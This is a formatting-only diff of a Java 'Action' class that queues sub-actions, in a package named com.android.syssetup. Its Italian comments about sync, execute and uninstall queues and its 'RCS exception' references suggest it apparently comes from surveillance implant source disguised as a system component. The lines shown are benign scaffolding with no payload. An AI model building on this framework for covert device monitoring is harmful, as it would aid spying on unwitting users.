@@ -7,53 +7,54 @@
 
 package com.android.syssetup.action;
 
-import java.util.ArrayList;
-import java.util.List;
-
-import org.json.JSONException;
-
 import com.android.syssetup.GeneralException;
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.conf.ConfAction;
 import com.android.syssetup.conf.ConfigurationException;
 import com.android.syssetup.util.Check;
 
+import org.json.JSONException;
+
+import java.util.ArrayList;
+import java.util.List;
+
 /**
  * The Class Action.
  */
 public class Action {
-	private static final String TAG = "Action"; //$NON-NLS-1$
-
-	/** The Constant ACTION_NULL. */
+	/**
+	 * The Constant ACTION_NULL.
+	 */
 	public static final int ACTION_NULL = -1;
-
-	/** Coda per tutte le action che non interagiscono con il core */
+	/**
+	 * Coda per tutte le action che non interagiscono con il core
+	 */
 	public static final int FAST_QUEUE = 0;
-
-	/** Coda per la sync, execute e uninstall */
+	private int queue = FAST_QUEUE;
+	/**
+	 * Coda per la sync, execute e uninstall
+	 */
 	public static final int MAIN_QUEUE = 1;
 
 	public static final int NUM_QUEUE = 2;
-	/** Action array. */
+	private static final String TAG = "Action"; //$NON-NLS-1$
+	/**
+	 * Action array.
+	 */
 	private final List<SubAction> list;
-
-	/** Action ID. */
+	/**
+	 * Action ID.
+	 */
 	private final int actionId;
-
 	private final String desc;
-
-	private int queue = FAST_QUEUE;
 
 	/**
 	 * Action constructor.
-	 * 
-	 * @param id
-	 *            : action id
+	 *
+	 * @param id   : action id
 	 * @param desc
-	 * @param num
-	 *            : number of subactions
-	 * @throws GeneralException
-	 *             the RCS exception
+	 * @param num  : number of subactions
+	 * @throws GeneralException the RCS exception
 	 */
 	public Action(final int id, String desc) {
 		if (Cfg.DEBUG) {
@@ -67,7 +68,7 @@ public class Action {
 
 	/**
 	 * Gets the id.
-	 * 
+	 *
 	 * @return the id
 	 */
 	public int getId() {
@@ -76,7 +77,7 @@ public class Action {
 
 	/**
 	 * Gets the sub actions num.
-	 * 
+	 *
 	 * @return the sub actions num
 	 */
 	public int getSubActionsNum() {
@@ -85,51 +86,44 @@ public class Action {
 
 	/**
 	 * Adds the sub action.
-	 * 
-	 * @param type
-	 *            the type
-	 * @param jsubaction
-	 *            the params
-	 * @throws GeneralException
-	 *             the RCS exception
+	 *
+	 * @param type       the type
+	 * @param jsubaction the params
+	 * @throws GeneralException       the RCS exception
 	 * @throws JSONException
 	 * @throws ConfigurationException
 	 */
 	public boolean addSubAction(final ConfAction actionConf) throws GeneralException, ConfigurationException {
 		if (actionConf.getType() != null) {
 			final SubAction sub = SubAction.factory(actionConf.getType(), actionConf);
-			
+
 			if (sub == null) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error (addSubAction): unknown type: " + actionConf.getType());//$NON-NLS-1$
 				}
-				
+
 				return false;
 			}
-			
+
 			list.add(sub);
-			
+
 			if (sub instanceof SubActionSlow) {
 				setQueue(MAIN_QUEUE);
 			}
-			
+
 			return true;
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error (addSubAction): null type ");//$NON-NLS-1$
 			}
-			
+
 			return false;
 		}
 	}
 
-	private void setQueue(int queue) {
-		this.queue = queue;
-	}
-
 	/**
 	 * Mainly for test purposes
-	 * 
+	 *
 	 * @param sub
 	 */
 	public void addSubAction(SubAction sub) {
@@ -138,12 +132,10 @@ public class Action {
 
 	/**
 	 * Gets the sub action.
-	 * 
-	 * @param index
-	 *            the index
+	 *
+	 * @param index the index
 	 * @return the sub action
-	 * @throws GeneralException
-	 *             the rCS exception
+	 * @throws GeneralException the rCS exception
 	 */
 	public SubAction getSubAction(final int index) throws GeneralException {
 		if (index < 0 || index >= list.size()) {
@@ -154,11 +146,15 @@ public class Action {
 	}
 
 	public SubAction[] getSubActions() {
-		return list.toArray(new SubAction[] {});
+		return list.toArray(new SubAction[]{});
 	}
 
 	public int getQueue() {
 		return queue;
+	}
+
+	private void setQueue(int queue) {
+		this.queue = queue;
 	}
 
 	public String getDesc() {
